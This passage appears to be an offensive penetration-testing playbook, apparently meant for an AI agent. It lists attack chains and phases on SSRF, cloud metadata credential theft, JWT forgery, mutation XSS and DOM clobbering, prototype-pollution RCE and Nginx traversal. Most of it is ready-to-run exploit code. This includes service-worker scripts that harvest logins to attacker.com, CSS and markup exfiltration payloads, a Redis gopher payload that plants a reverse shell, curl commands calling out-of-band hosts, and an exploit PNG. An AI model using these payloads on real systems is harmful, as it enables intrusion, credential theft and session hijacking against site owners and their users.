1. Find SSRF parameter (Phase 8)
2. url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Read role name from response
4. url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
5. Extract: AccessKeyId, SecretAccessKey, Token
6. aws sts get-caller-identity --profile compromised  -> confirms access
7. aws s3 ls -> list all S3 buckets
8. aws secretsmanager list-secrets -> all application secrets
Evidence needed: actual AWS credentials + successful sts:GetCallerIdentity call
```

### Chain C: GitHub Credential -> Live API -> Data Access
```
1. Find credential in GitHub test files (Phase 4)
2. Test against live API (not just test environment)
3. With valid API key: enumerate all accessible endpoints
4. Find endpoint returning PII/business data without additional auth
5. Extract sample data as evidence
Evidence needed: API call returning real sensitive data with leaked key
```

### Chain D: Dependency Confusion -> CI/CD -> RCE
```
1. Confirm internal package name (stack trace, pom.xml)
2. Confirm namespace unclaimed publicly (Phase 6)
3. Confirm private Nexus exists (DNS)
4. Request authorization for DNS-only PoC
5. With auth: register package name publicly with version=99.0.0
6. Package's install script: curl <interactsh>/?host=$(hostname)
7. If callback received from CI runner = CONFIRMED RCE in build pipeline
Evidence needed: interactsh callback from target's build infrastructure
```

### Chain E: Subdomain Takeover -> OAuth Token Theft
```
1. Find dangling CNAME (Phase 11): sub.target.com -> unclaimed.github.io
2. Claim the GitHub Pages repo (or Heroku app, etc.)
3. Host page: <script>document.location="https://target.com/oauth/authorize?...&redirect_uri=https://sub.target.com/steal"</script>
4. OAuth redirects back to your controlled subdomain with access_token in URL
5. Harvest token, make API calls as victim
Evidence needed: demonstrate token receipt on controlled page (with own test account)
```

### Chain F: JWT RS256 Public Key -> Account Takeover
```
1. Fetch public key: GET /.well-known/jwks.json
2. Decode your JWT, check alg=RS256
3. Create forged JWT:
   - Change alg to HS256
   - Change payload: role=admin, userId=<target_user_id>
   - Sign with PUBLIC KEY as HMAC secret (the confusion attack)
4. Send forged JWT to API
5. If accepted: full account takeover / admin access
Evidence needed: API response showing other user's data with forged token
```

### Chain G: mXSS -> Service Worker -> Persistent Session Hijack (Black Hat / DEF CON)
```
1. Find DOMPurify version < 3.1.3 in JS bundles (grep for version string)
2. Find any field where user input is sanitized then re-inserted into innerHTML
3. Inject mXSS payload (MathML namespace confusion):
   <math><mtext><table><mglyph><style><!--</style><img title="--></style><img src onerror="
   navigator.serviceWorker.register('https://attacker.com/sw.js')">
4. Service worker installed on victim's browser persists for weeks
5. SW intercepts every request: captures tokens, session cookies, form submissions
Evidence needed: service worker appears in DevTools, requests intercepted to your server
```

### Chain H: PDF Generator SSRF -> AWS Metadata -> IAM Credentials
```
1. Find "Export PDF" / "Generate Report" / "Print Invoice" feature (Phase 26)
2. Inject into any field that renders in PDF:
   <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
3. Download PDF, extract text layer - IAM role name appears in PDF content
4. Second request: <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"></iframe>
5. AccessKeyId + SecretAccessKey + Token in PDF = full cloud access
Evidence needed: AWS credentials visible in PDF + sts:GetCallerIdentity confirms access
```

### Chain I: Prototype Pollution -> EJS Gadget -> Server RCE (USENIX 2023)
```
1. Find Node.js app using lodash.merge, qs, or any deep-merge on user input
2. Fuzz JSON body: {"__proto__":{"polluted":"yes"}} -> check if reflected anywhere
3. If pollution confirmed, escalate to EJS RCE gadget:
   POST /api/settings {"__proto__":{"outputFunctionName":"x;require('child_process').execSync('curl https://your-interactsh-url/$(id)')//"}
4. Trigger any EJS template render (GET /dashboard, /profile, etc.)
5. Interactsh callback with whoami output = CONFIRMED RCE
Evidence needed: DNS/HTTP callback from server with command output
```

### Chain J: ECDSA Nonce Reuse -> Private Key Recovery -> Mass Account Takeover
```
1. Collect 50+ ES256 JWT tokens from the same app
2. Decode each: base64url decode signature, extract r and s components
3. Check for identical r values - same r = same nonce k used twice
4. Recover private key: k = (h1-h2)/(s1-s2) mod n; d = (s1*k - h1)/r mod n
5. Forge JWT for any user ID with recovered private key
6. OR: if Java 15-18, try Psychic Signatures (blank sig): alg=ES256, sig=base64(00...00)
Evidence needed: forged JWT accepted, returns other user's account data
```

### Chain K: Nginx Alias Traversal -> App Source Code -> Hardcoded Creds -> DB Access
```
1. Find static file serving: /static/, /assets/, /media/, /uploads/
2. Test alias traversal: curl https://<target>/static../etc/passwd
3. If 200 with file content: confirmed off-by-slash in Nginx config
4. Target app source: /static../app/config.py, /assets../app/.env, /media../app/settings.py
5. Extract DB credentials, API keys, signing secrets from source
6. Use DB credentials to connect directly to database (if port exposed)
Evidence needed: source file contents with credentials + successful DB/API auth
```

---

## Phase 24 - Browser-Side Client Attacks (Conference Research: DEF CON/Black Hat)

**These bypass all server-side WAFs and sanitizers. Target the client, not the server.**

### mXSS - Mutation XSS (DOMPurify Bypass)
```bash
# Check DOMPurify version in JS bundles
grep -r "DOMPurify" ./js_bundles/ | grep "version\|VERSION\|v[0-9]"
# Vulnerable: < 3.1.3

# MathML namespace confusion (bypasses DOMPurify < 3.1.3, CVE-2024-47875):
<math><mtext><table><mglyph><style><!--</style><img title="--></style><img src onerror=alert(1)>">

# noscript bypass (when app uses FORCE_BODY option):
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# SVG namespace confusion (< 2.2.2):
<svg><p><style><!--</style><img title="--></style><img src onerror=alert(1)>">

# Confirm: does alert() fire despite sanitizer passing the input?
# If yes: full XSS = can read cookies, localStorage, make authenticated requests
```

### DOM Clobbering (IEEE S&P 2023)
```html
<!-- Find JS reading uninitialized globals: window.config, document.scriptURL, etc. -->
<!-- Inject HTML (not JS) to overwrite those globals: -->

<!-- Clobber window.config.scriptUrl to load attacker script -->
<a id=config><a id=config name=scriptUrl href=https://attacker.com/evil.js>

<!-- Two-level clobbering: window.x.y -->
<form name=x><input id=y value="https://attacker.com/evil.js"></form>

<!-- Service worker hijack via DOM clobbering (PortSwigger 2022) -->
<a id=scriptURL href=//attacker.com/sw.js></a>
<!-- navigator.serviceWorker.register(scriptURL) -> loads attacker's SW -->
```

### CSS Injection - CSRF Token Theft (Huli / corCTF 2022)
```css
/* Find: user input rendered inside <style> tag without JS execution */
/* Exfiltrate CSRF token char by char via attribute selectors + CSS url() */

/* Inject this CSS: */
input[name=csrf][value^=a]{background:url(https://attacker.com/?c=a)}
input[name=csrf][value^=b]{background:url(https://attacker.com/?c=b)}
/* ... all chars ... */

/* Chrome 105+ - use :has() for parent targeting: */
form:has(input[name=csrf][value^=a]){background:url(https://attacker.com/?c=a)}

/* Nonce exfiltration (CSP bypass): */
script[nonce^=a]{background:url(https://attacker.com/?n=a)}
/* Repeat for each position -> reconstruct full nonce -> bypass CSP -> XSS */
```

### Dangling Markup Injection (PortSwigger Research)
```html
<!-- Use when: HTML injection works but JS is blocked by CSP -->
<!-- Inject unclosed attribute that "eats" subsequent page content -->

<!-- If CSRF token appears below your injection point in HTML source: -->
<img src='https://attacker.com/collect?data=
<!-- Browser treats everything until next ' as part of src value -->
<!-- Server receives: GET /collect?data=...csrftoken=SECRET123...  -->

<!-- Meta refresh variant (causes navigation): -->
<meta http-equiv="refresh" content="0; url=https://attacker.com/?data=
<!-- Captures everything until closing ' as URL parameter -->
```

### Service Worker XSS Persistence
```javascript
// Via any XSS: install persistent service worker that survives page close
navigator.serviceWorker.register('https://attacker.com/evil-sw.js', {scope: '/'})

// evil-sw.js - intercepts ALL requests from that origin indefinitely:
self.addEventListener('fetch', event => {
  const req = event.request.clone();
  // Exfil every request URL + body + cookies
  req.text().then(body => fetch('https://attacker.com/log?url='
    + encodeURIComponent(req.url) + '&body=' + encodeURIComponent(body)));
  event.respondWith(fetch(event.request));
});

// Login form credential harvester:
self.addEventListener('fetch', event => {
  if (event.request.url.includes('/login')) {
    event.respondWith(event.request.clone().formData().then(data => {
      fetch('https://attacker.com/creds?u=' + data.get('username') + '&p=' + data.get('password'));
      return fetch(event.request);
    }));
  }
});
// Persist for weeks. Survives cache clear. Removed only by explicit unregister.
```

---

## Phase 25 - Prototype Pollution & Second-Order Injection (USENIX Security 2023)

### Prototype Pollution -> RCE
```bash
# Detect: fuzz any deep-merge endpoint (settings, preferences, profile update)
curl -X POST https://<target>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'
# Then: GET /api/settings -> if "polluted":"yes" appears = PP confirmed

# Also try:
{"constructor":{"prototype":{"polluted":"yes"}}}

# Escalate to RCE via EJS template gadget (most common Node.js gadget):
curl -X POST https://<target>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"x;require(\"child_process\").execSync(\"curl https://YOUR-INTERACTSH/?x=$(whoami)\")//"}}'
# Then trigger any page render that uses EJS

# Pug template gadget:
{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}}

# NODE_OPTIONS gadget (Node >= 19, PortSwigger 2023):
{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}
# Then trigger any child_process.spawn call
```

### Second-Order Injection
```bash
# Concept: inject payload in step 1, it's stored safely.
# Trigger: in step 2, stored data is used in a different (vulnerable) context.

# Example - SQLi stored in username, triggered in admin search:
# Step 1: Register with username = admin'-- (stored without immediate execution)
# Step 2: Admin searches for user -> username inserted into SQL without sanitization

# Example - SSTI stored in display name, triggered in email template:
# Step 1: Set display name = {{7*7}} (stored as text)
# Step 2: System sends welcome email using display name in template -> 49 in email

# Detection: test all stored fields with template injection probes
# {{7*7}}, ${7*7}, #{7*7}, *{7*7}
# Check ALL places where stored value is used: emails, reports, logs, admin views
# Not just where it's displayed to you - where it's processed by OTHERS
```

---

## Phase 26 - File Processing Attacks

### PDF Generator SSRF (Headless Chrome / wkhtmltopdf)
```bash
# Find: "Export PDF", "Print Report", "Generate Invoice", "Download" features
# Detect technology: look for Gotenberg, wkhtmltopdf, Puppeteer in error messages

# Inject into any field that renders in the PDF:

# SSRF to AWS metadata:
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>

# Local file read (wkhtmltopdf / older Puppeteer):
<iframe src="file:///etc/passwd"></iframe>
<iframe src="file:///proc/self/environ"></iframe>

# Full wkhtmltopdf exploit (JS enabled by default in old versions):
<script>
  var x = new XMLHttpRequest();
  x.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
  x.send();
  document.write('<img src="https://attacker.com/?d=' + btoa(x.responseText) + '">');
</script>

# Confirm: PDF contains internal data / file content / OOB callback received
```

### ImageMagick & FFmpeg SSRF (CVE-2022-44268 + protocol handlers)
```bash
# ImageMagick - arbitrary file read via PNG tEXt chunk (CVE-2022-44268):
# Create malicious PNG:
python3 -c "
import struct, zlib
def chunk(t, d): c=t+d; return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
sig = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
text = chunk(b'tEXt', b'profile\x00/etc/passwd')  # file to read
idat = chunk(b'IDAT', zlib.compress(b'\x00\xff\xff\xff'))
iend = chunk(b'IEND', b'')
open('exploit.png','wb').write(sig+ihdr+text+idat+iend)
"
# Upload to any image processing endpoint, then view/download the result
# Leaked file contents appear in the processed image metadata

# MVG/MSL file SSRF (ImageMagick protocol handlers):
# Upload file named "exploit.png" with content:
# push graphic-context
# viewbox 0 0 640 480
# image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/'
# pop graphic-context

# FFmpeg HLS SSRF - upload video with playlist referencing internal URLs:
# #EXTM3U
# #EXT-X-MEDIA-SEQUENCE:0
# #EXTINF:,
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### WebAssembly (WASM) Binary Analysis
```bash
# Find WASM files:
# Network tab -> filter by ".wasm" OR grep JS bundles for "WebAssembly.instantiate"

# Download and extract strings:
curl https://<target>/static/app.wasm -o app.wasm
strings app.wasm | grep -iE "(api[_-]?key|secret|token|password|sk_|pk_|Bearer|Authorization)"

# Convert to readable WAT format (WABT toolkit):
wasm2wat app.wasm -o app.wat
grep -i "secret\|key\|token\|password" app.wat

# Full decompile to pseudo-C:
wasm-decompile app.wasm -o app_decompiled.c

# Extract data segment (string constants):
python3 -c "
with open('app.wasm','rb') as f: data=f.read()
import re
for s in re.findall(b'[\x20-\x7e]{8,}', data): print(s.decode())
" | grep -iE "(key|secret|token|api|auth|pass)"

# Confirm: test extracted credentials against live API
```

---

## Phase 27 - Mass Assignment & Insecure Randomness

### Mass Assignment (OWASP API Top 10 2023)
```bash
# Concept: API auto-binds ALL JSON fields to model, including protected ones

# Step 1: GET /api/user/profile -> note fields in response (role, isAdmin, credits, plan)
# Step 2: Try sending those fields in PUT/POST:
curl -X PUT https://<target>/api/user/profile \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","isAdmin":true,"credits":99999,"plan":"enterprise","emailVerified":true}'

# GraphQL mass assignment - try read-only fields in mutations:
mutation { updateUser(input: {id:"me", name:"test", role:"ADMIN", organizationRole:"owner"}) { id role } }

# Discover hidden fields with Arjun:
python3 arjun.py -u https://<target>/api/users -m POST --include '{"username":"x"}'

# Confirm: GET /api/user/profile -> check if role/isAdmin/credits changed
```

### Insecure Randomness & Predictable Tokens
```python
import requests, time, hashlib, itertools

# Collect 20 password reset tokens rapidly
tokens = []
for _ in range(20):
    r = requests.post("https://<target>/forgot-password", data={"email": "your@test.com"})
    # Extract token from email (use mailinator/temp mail)
    tokens.append(extract_token_from_email())

# Analyze patterns:
# 1. Sequential? Sort tokens, check if consecutive
# 2. Timestamp-based? Does token decode to current timestamp?
# 3. MD5/SHA of email+timestamp?
t = int(time.time())
for delta in range(-5, 5):
    candidate = hashlib.md5(f"victim@corp.com{t+delta}".encode()).hexdigest()
    r = requests.get(f"https://<target>/reset?token={candidate}")
    if r.status_code == 200: print(f"CONFIRMED: token = {candidate}")

# Math.random() state recovery (V8 engine - 10-15 observations enough):
# Tool: https://github.com/d0nutptr/v8_rand_buster
# If tokens generated via Math.random() in Node.js -> predict all future tokens

# UUID v1 (time-based) prediction:
# UUIDv1 contains: 60-bit timestamp + clock sequence + MAC address
# If two tokens share similar UUIDs -> timestamp extractable -> brute force range
import uuid
parsed = uuid.UUID(observed_token)
if parsed.version == 1:
    print(f"Timestamp: {parsed.time}")  # nanoseconds since Oct 1582
    # Enumerate nearby timestamp values to find other valid UUIDs
```

---

## Phase 28 - Infrastructure Path Attacks

### Nginx Alias Traversal - Off-by-Slash (David Hamann / Bayot)
```bash
# Vulnerable Nginx config (location has no trailing slash, alias does):
# location /files { alias /data/uploads/; }
# GET /files../etc/passwd -> /data/etc/passwd -> /etc/passwd

# Test systematically:
for prefix in static assets files media uploads images js css; do
  result=$(curl -s "https://<target>/${prefix}../etc/passwd" 2>/dev/null)
  if echo "$result" | grep -q "root:"; then
    echo "VULNERABLE: /${prefix}../etc/passwd"
  fi
done

# Target high-value files:
curl "https://<target>/static../app/.env"
curl "https://<target>/assets../app/config.py"
curl "https://<target>/media../app/settings.py"
curl "https://<target>/uploads../proc/self/environ"
curl "https://<target>/files../etc/shadow"

# With URL encoding (if direct path blocked):
curl "https://<target>/static%2e%2e/etc/passwd"
curl "https://<target>/static%252e%252e/etc/passwd"  # double encoded

# Automated: nginxpwner tool
python3 nginxpwner.py -u https://<target> -w wordlists/static-prefixes.txt
```

### HTTP Desync - CL.0 & Browser-Powered (James Kettle, Black Hat 2022)
```
# CL.0 detection (pause-based - works on single servers, no proxy needed):
# Send request with Content-Length but pause before body:
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Length: 34
Connection: keep-alive

[PAUSE 6 SECONDS - do not send body]

# If server returns response WITHOUT waiting for body = CL.0 confirmed
# Body of first request becomes prefix of second request

# Browser-Powered Desync (Client-Side Desync - no proxy required):
# Host on attacker.com, victim visits:
fetch('https://vulnerable.com/api/endpoint', {
  method: 'POST',
  body: 'GET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n',
  mode: 'no-cors',
  credentials: 'include',
  keepalive: true  # forces reuse of connection
});
# Next request from victim's browser to vulnerable.com is prefixed with /admin

# H2.CL (HTTP/2 to HTTP/1.1 downgrade):
# Burp Suite -> Repeater -> HTTP/2
:method: POST
:path: /api
content-length: 0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 5

x=1
# Timing >6s = desync confirmed
```

---

## Phase 29 - Cryptographic Weaknesses

### ECDSA Nonce Reuse & Psychic Signatures (CVE-2022-21449)
```python
import base64, json

# Step 1: Collect 50+ ES256/ES384 JWT tokens
# Step 2: Decode and compare signature 'r' components
def decode_jwt_sig(token):
    sig_b64 = token.split('.')[2]
    sig = base64.urlsafe_b64decode(sig_b64 + '==')
    r = int.from_bytes(sig[:len(sig)//2], 'big')
    s = int.from_bytes(sig[len(sig)//2:], 'big')
    return r, s

# If any two tokens share the same 'r' value -> private key recoverable
tokens = [...]  # collected JWTs
for i, t1 in enumerate(tokens):
    r1, s1 = decode_jwt_sig(t1)
    for t2 in tokens[i+1:]:
        r2, s2 = decode_jwt_sig(t2)
        if r1 == r2:
            print("NONCE REUSE DETECTED - private key recoverable!")
            # Use: tintinweb/ecdsa-private-key-recovery tool

# CVE-2022-21449 Psychic Signatures (Java JDK 15-18):
# All-zero ECDSA signature passes verification on vulnerable Java versions
# Forge admin JWT:
header  = base64.urlsafe_b64encode(json.dumps({"alg":"ES256","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","iat":9999999999}).encode()).rstrip(b'=')
fake_sig = base64.urlsafe_b64encode(b'\x00' * 64).rstrip(b'=')
forged_jwt = f"{header.decode()}.{payload.decode()}.{fake_sig.decode()}"
# Test against target - if Java 15-18 used (check Server header, error stack traces)
```

---

## Phase 30 - XS-Leaks & Cross-Site Side Channels (DEF CON 29 / USENIX 2022)

**Leak authenticated user data cross-origin without any JavaScript execution on target.**

```javascript
// XS-Leaks: infer cross-origin state via timing, cache, or error behaviors
// Use case: determine if victim has specific data (email registered, order exists, is admin)

// Cache Probing (most reliable):
async function probeCache(url) {
  // Evict from cache
  await fetch(url, {mode: 'no-cors', cache: 'reload'});
  await new Promise(r => setTimeout(r, 200));
  // Measure re-load time
  const start = performance.now();
  await fetch(url, {mode: 'no-cors', cache: 'force-cache'});
  return performance.now() - start;
}
// <5ms = cache hit (data exists), >50ms = cache miss
const time = await probeCache("https://target.com/api/orders?id=12345");
console.log(time < 10 ? "ORDER EXISTS" : "NO ORDER");

// iframe load timing (different page size = different load time):
function timeiframe(url) {
  return new Promise(resolve => {
    const start = performance.now();
    const iframe = document.createElement('iframe');
    iframe.onload = () => resolve(performance.now() - start);
    iframe.src = url;
    document.body.appendChild(iframe);
  });
}
const t = await timeiframe("https://target.com/search?q=secret@corp.com");
// Larger response (result found) = longer load time

// Error oracle (authentication check via cross-origin image):
const img = new Image();
img.onerror = () => console.log("AUTHENTICATED CONTENT (403 from unauth request)");
img.onload  = () => console.log("PUBLIC (200 response)");
img.src = "https://target.com/api/admin/secret-resource";

// Network timing oracle:
// Run 20 probes, take median - consistent >20ms delta = information leakage confirmed
```

---

## Phase 31 - SAML & SSO Attack Vectors

```python
# SAML attacks on SSO implementations

# 1. XML Signature Wrapping (XSW)
# SAML response has: <Signature> wraps <Assertion>
# XSW: add SECOND assertion with attacker role, move signature to cover original only
# Server processes the unsigned (attacker-controlled) assertion

# Test: intercept SAML response (base64 in POST parameter)
import base64
saml_b64 = "<from_burp>"
saml_xml = base64.b64decode(saml_b64).decode()
# Look for: <saml:NameID>, <saml:Attribute Name="role">, signature scope

# 2. SAML Comment Injection (CVE-2018-0489 style, still common)
# In NameID field: attacker<!---->@corp.com
# Some parsers strip XML comments -> becomes attacker@corp.com
# If attacker@corp.com exists in SAML response = impersonation

# 3. Signature Exclusion (if signature is optional)
# Remove the <Signature> element entirely
# Some poorly implemented SP do not enforce signature requirement

# 4. SAML Response Replay
# Intercept SAML assertion, submit again from different session
# If no NotOnOrAfter check or Replay protection = session fixation

# 5. IdP Confusion / SP Impersonation
# Craft SAML assertion for your controlled IdP
# Submit to target SP with your IdP's signature
# If SP accepts assertions from any IdP = full account takeover

# Tools:
# saml-raider (Burp extension) - modifies SAML in-flight
# SAMLExtractor (Python) - decodes + analyzes SAML assertions
# evilginx3 - SAML phishing proxy for token theft
```

---

## Evidence Classification Rules

**CONFIRMED CRITICAL** (requires ALL):
- HTTP response body contains actual sensitive data
- Data is clearly sensitive (credentials, PII, internal architecture)
- Attack is reproducible with exact curl/python command

**POTENTIAL CRITICAL** = probe indicates vulnerability but no data extracted

**INFORMATIONAL** = prerequisite confirmed but exploitability unproven

**NOT A FINDING:**
- HTTP 200 with 0-byte body (WAF catch-all)
- TCP connection established (port open != access)
- DNS resolves to private IP (informational alone, not a finding)
- OOB callback received without data in body (proves SSRF exists, not Critical yet)

---

## Output

Write to `~/pentest-toolkit/results/<target>/interesting_zerodayhunt.md`:

```markdown
## Status
findings-present | no-findings

## Summary
<confirmed count, potential count, highest severity, key attack chain>

## Confirmed Findings
- [CONFIRMED CRITICAL] <attack type> on <endpoint>
  Chain: <how this connects to other findings>
  Evidence: <exact response snippet>
  Reproduce: <exact command>

## Potential Findings
- [POTENTIAL] <attack type> - requires <what is needed to confirm>
  Chain opportunity: <what this enables if confirmed>

## Supply Chain Surface
- <package names unclaimed on npm/Maven>
- Authorization status: pending | granted | not-applicable

## Attack Chains Identified
1. <Chain name>: <finding A> + <finding B> -> <Critical impact>

## Next Steps
1. <highest priority unconfirmed vector>
2. <authorization needed for X>
3. <chain that needs one more piece>
```

Tell user: "Zero-day hunt complete. `interesting_zerodayhunt.md` written.
Key finding: <one-liner on most critical>. Run `/report <target>` to compile."

---

## Phase 32 - Blind SSRF OOB (Out-of-Band) Chain

**When you have SSRF but get no response body - prove it with OOB callbacks, then escalate.**

### Step 1: Confirm Blind SSRF with Interactsh

```bash
# Set up OOB listener (interactsh-client):
interactsh-client -v

# Get your unique URL: abcdef123.oast.me
# Inject into every URL parameter, header, and body field:

OAST="http://abcdef123.oast.me"

# Common SSRF parameters to test:
for param in url url1 src source dest destination redirect next return path file fetch image callback webhook notify; do
  curl -s "https://<target>/api/proxy?${param}=${OAST}/${param}" &
done

# Also test in request body:
curl -X POST "https://<target>/api/fetch" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"${OAST}/json-body\"}"

# Test in headers (server-side request via header forwarding):
curl "https://<target>/api/check" \
  -H "X-Forwarded-For: ${OAST}" \
  -H "Referer: ${OAST}/referer" \
  -H "X-Forwarded-Host: ${OAST}"

# Test in file upload (SVG SSRF):
cat > /tmp/ssrf.svg << EOF
<svg xmlns="http://www.w3.org/2000/svg">
<image href="${OAST}/svg-upload"/>
</svg>
EOF
curl -X POST "https://<target>/api/upload" -F "file=@/tmp/ssrf.svg"

# Test in PDF generator:
curl -X POST "https://<target>/api/export-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"<iframe src='${OAST}/pdf'></iframe>\"}"

# Interactsh shows: DNS lookup + HTTP request = SSRF confirmed
# Evidence: log line from interactsh-client showing callback from <target> server IP
```

### Step 2: Identify Internal Network via OOB Timing

```python
#!/usr/bin/env python3
# blind_ssrf_enum.py - map internal network via timing differences
import requests, time, statistics

TARGET = "https://<target>/api/fetch"
HEADERS = {"Cookie": "session=<token>", "Content-Type": "application/json"}

def probe(ip, timeout=3):
    """Timing probe: existing host connects (slow), nonexistent host fails fast."""
    start = time.perf_counter()
    try:
        requests.post(TARGET, json={"url": f"http://{ip}/"}, headers=HEADERS, timeout=timeout)
    except:
        pass
    return time.perf_counter() - start

# Establish baseline for non-existent host:
baseline = statistics.mean([probe("10.255.255.254") for _ in range(5)])
print(f"Baseline (nonexistent): {baseline:.3f}s")

# Scan common internal ranges:
live_hosts = []
for last_octet in range(1, 255):
    ip = f"10.0.0.{last_octet}"
    t = probe(ip)
    if t > baseline * 1.5:  # Significantly slower = host exists
        print(f"LIVE: {ip} ({t:.3f}s vs baseline {baseline:.3f}s)")
        live_hosts.append(ip)

print(f"\nLive internal hosts: {live_hosts}")
```

### Step 3: Escalate to Data Exfil via DNS

```python
#!/usr/bin/env python3
# dns_exfil_ssrf.py - exfiltrate data via DNS subdomain when HTTP response is blocked

# Technique: DNS label in request URL -> response data sent as DNS query to your NS
# Requires: control of a domain with custom NS records

EXFIL_DOMAIN = "exfil.yourdomain.com"  # you control NS for this domain

def dns_exfil(target_url, data_url, session_cookie):
    """
    Make target server fetch a URL that contains the exfiltrated data in the DNS label.
    e.g., target fetches: http://<base64_data>.exfil.yourdomain.com/
    Your NS logs: query for <base64_data>.exfil.yourdomain.com = data received
    """
    import base64
    # 1. Find SSRF parameter
    # 2. Construct URL: http://169.254.169.254/...?callback=http://DATA.exfil.domain/
    # 3. Some apps will make a second request to the callback URL with data

    # For blind XXE + DNS exfil:
    xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % data SYSTEM "{data_url}">
  <!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.{EXFIL_DOMAIN}/'>">
  %send;
]>
<x>&exfil;</x>"""
    return xxe_payload

# Direct SSRF + DNS exfil (Interactsh HTTP):
# 1. Server fetches: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 2. Response goes to: interactsh HTTP handler
# Use curl-based OOB for apps that support redirect chaining:
print(f"""
# Step 1: Serve redirect at your controlled server:
# GET /ssrf-redirect -> 302 to http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Send SSRF pointing to your redirect URL:
# url=https://your-server.com/ssrf-redirect

# If target follows redirects -> fetches metadata -> response in HTTP interactsh log
""")
```

### Step 4: SSRF Protocol Escalation

```bash
# Beyond HTTP - try alternative protocols in SSRF parameters:

OAST="http://abcdef123.oast.me"

# Gopher protocol (SSRF to Redis, Memcached, SMTP):
# Gopher allows sending raw TCP bytes via SSRF
# Redis RCE via Gopher (if Redis on 6379 with no auth):
python3 -c "
import urllib.parse
cmd = '\r\n'.join(['*3','$3','SET','$8','deadbeef','$50','\n\n*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n'])
gopher = 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(cmd)
print(gopher)
"
# curl "https://<target>/api/fetch?url=<gopher-url>"

# file:// protocol (local file read if allowed):
curl "https://<target>/api/fetch?url=file:///etc/passwd"
curl "https://<target>/api/fetch?url=file:///proc/self/environ"
curl "https://<target>/api/fetch?url=file:///app/.env"

# dict:// protocol (port scanner):
curl "https://<target>/api/fetch?url=dict://127.0.0.1:22/"
# Response time difference -> port open/closed

# ftp:// (some apps allow, can read local files via FTP PASV):
curl "https://<target>/api/fetch?url=ftp://127.0.0.1:21/"

# SSRF + SMTP (gopher to send email from internal SMTP):
python3 -c "
smtp_cmd = 'EHLO attacker\r\nMAIL FROM:<ssrf@attacker.com>\r\nRCPT TO:<victim@corp.com>\r\nDATA\r\nSubject: SSRF\r\nSSRF test\r\n.\r\nQUIT\r\n'
import urllib.parse
print('gopher://127.0.0.1:25/_' + urllib.parse.quote(smtp_cmd))
"
```

### Evidence Chain for Blind SSRF

```
INFORMATIONAL:   DNS OOB callback only (no HTTP, no data)
CONFIRMED-LOW:   HTTP OOB callback (server confirmed making requests)
CONFIRMED-HIGH:  SSRF to internal IP that returns different response than nonexistent IP
CONFIRMED-CRIT:  SSRF -> metadata service -> IAM credentials extracted
               OR SSRF -> internal API -> PII data returned
               OR SSRF -> Redis/Memcached via Gopher -> RCE

NOT A FINDING:
- DNS OOB if you only tested from your own machine (could be browser, not server)
- HTTP OOB if Referer/Origin header from client (not server-side request)
Always verify: OOB callback IP should be TARGET SERVER IP, not your own
```
